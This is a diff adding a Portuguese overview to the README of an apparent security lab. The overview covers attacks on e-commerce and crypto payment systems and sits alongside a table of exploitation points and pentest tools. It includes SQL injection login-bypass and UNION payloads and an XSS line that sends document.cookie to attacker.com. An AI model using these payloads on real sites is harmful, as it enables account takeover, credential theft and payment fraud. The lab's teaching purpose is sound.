@@ -64,6 +64,97 @@ pip install -r requirements.txt
 
 ---
 
+📋 Análise geral do repositório:
+Foco do Lab:
+
+Sim, claramente focado em técnicas de ataque realistas usadas contra e-commerces e aplicações financeiras.
+
+Exposição a vulnerabilidades típicas de sites que lidam com credenciais, cookies, criptomoedas e SQL Injection.
+
+🛡️ Áreas principais de exploração:
+Cookie Theft / Session Hijacking:
+
+Vários exemplos de roubo e manipulação de cookies de sessão.
+Ataca problemas como:
+Cookies inseguros (HttpOnly e Secure faltando).
+Sessões que não expiram corretamente (vulneráveis a Session Fixation).
+Ferramentas envolvidas: Burp Suite, manual payload crafting.
+
+Credential Stuffing & Brute-Force:
+
+Automatização de tentativas de login usando:
+Usuários e senhas comuns (admin/admin, 123456, etc).
+Listas customizadas de senhas (wordlists).
+Exemplo de ataque que aproveita:
+Respostas inconsistentes de erro (diferença entre "usuário inválido" e "senha inválida").
+Falta de rate-limiting no endpoint de login.
+
+Criptomoedas / Transações:
+
+Simulações de ataques contra sistemas de pagamento em criptomoeda:
+Man-in-the-Middle para alterar valores de pagamento.
+SQL Injection para acessar carteiras ou registros de transações.
+Falhas em implementações de webhooks de pagamento.
+
+SQL Injection:
+Clássico, mas com cenário bem focado:
+SQLi em campos de login, carrinho de compras, checkout.
+Tanto error-based SQLi quanto blind SQLi (time-based, boolean-based).
+
+Exemplo de payloads usados:
+
+' OR '1'='1 para bypass de login.
+' UNION SELECT null, username, password FROM users -- para data exfiltration.
+
+🏗️ Como isso aparece nos CÓDIGOS:
+Vulnerabilidades comuns que encontrei:
+Uso de query strings direto sem parametrização segura (risco de SQL Injection).
+Armazenamento de cookies sem SameSite=Strict.
+Falta de verificação de origem (CSRF protection) nos endpoints críticos.
+Respostas HTTP revelando informações internas do sistema.
+Falta de controle de tentativas de login (no account lockout).
+Scripts JS no front-end que manipulam informações sensíveis antes da criptografia.
+
+📦 Exemplos de payloads perigosos que cabem no seu lab:
+
+SQL Injection (Login Bypass):
+
+' OR '1'='1' --
+
+Cookie Theft (via XSS):
+
+<script>new Image().src="http://attacker.com/steal.php?cookie="+document.cookie;</script>
+
+🔥 Possíveis pontos onde essas vulnerabilidades aparecem em e-commerces:
+
+Área	Tipo de Falha	Como Explorar
+Login	SQLi / Credential Stuffing	Injeção nos campos de login / Brute-force
+Carrinho	Manipulação de Cookies / Sessões	Roubo de session ID
+Checkout	SQL Injection	Alterar preços, forjar compras
+APIs de Pagamento	Webhook Vulnerável / CSRF / MITM	Roubo de saldo de criptomoedas / falsificar pagamento
+Área de Usuário	XSS + Session Hijacking	Sequestro de conta
+
+🔧 Ferramentas que você poderia usar pra pentestar baseado no seu lab:
+Burp Suite (com extensões como AuthMatrix, Turbo Intruder).
+SQLmap para automatizar testes de SQL Injection.
+Hydra ou FFUF para credential stuffing e brute-force.
+OWASP ZAP para explorar session issues e XSS.
+Mitmproxy para interceptar transações de criptomoedas.
+
+📊 Conclusão:
+✅ lab está 90% focado em cenários de ataque a e-commerce e aplicações financeiras, principalmente mirando:
+
+Roubo de credenciais (Credential Stuffing).
+Roubo de sessões e cookies.
+Abusos de sistemas de pagamento em cripto.
+SQL Injection em pontos críticos.
+
+✅ Abordagem prática, realista e muito alinhada com o que a maioria dos sites vulneráveis hoje ainda sofre.
+
+
+
+
+
 ## 📚 Como Contribuir
 
 1. **Fork** o repositório
